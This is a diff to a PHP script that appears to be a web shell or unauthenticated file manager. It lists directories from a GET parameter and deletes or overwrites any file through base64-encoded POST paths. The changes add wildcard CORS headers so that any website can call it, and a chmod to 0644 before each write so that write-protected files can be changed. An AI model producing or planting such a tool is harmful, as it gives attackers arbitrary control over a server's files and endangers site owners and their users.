@@ -1,7 +1,17 @@
 <?php
+header('Access-Control-Allow-Origin: *');
+header('AMP-Access-Control-Allow-Source-Origin: *');
+header('Access-Control-Expose-Headers: AMP-Access-Control-Allow-Source-Origin');
 define("_home", dirname(__FILE__));
 // define("_home", $_SERVER['DOCUMENT_ROOT']);
 define('_XXX', $_SERVER['PHP_SELF']);
+
+
+function perm($path)
+{
+    return substr(sprintf('%o', fileperms($path)), -4);
+}
+
 
 
 $postDir = isset($_GET['dir']) ? $_GET['dir'] : _home;
@@ -15,6 +25,7 @@ if (isset($_POST['delete'])) {
 }
 
 if (isset($_POST['edit'])) {
+    chmod(base64_decode($_POST['path']), 0644);
     file_put_contents(base64_decode($_POST['path']), $_POST['data']);
 }
 
@@ -58,6 +69,7 @@ function getDir($path)
     }
 
     // $arr = array_merge($arrFolder, $arrFile);
+
 
     return $arr;
 }
@@ -304,6 +316,7 @@ function formatBytes($bytes, $precision = 2)
                     </a>
 
 
+                    [<?= perm($val) ?>]
                     <?php
 
                     if (!is_dir($val)) {
@@ -312,6 +325,7 @@ function formatBytes($bytes, $precision = 2)
                         echo "<i onclick=\"deleteFile('" . base64_encode($val) . "')\" style='color: #ff7675; font-size: 20px' class='bx bxs-trash-alt' ></i>";
                         echo "</div>";
                     }
+
 
 
                     ?>
@@ -353,6 +367,8 @@ function formatBytes($bytes, $precision = 2)
 
         })
     </script>
+
+
 
 </body>
 
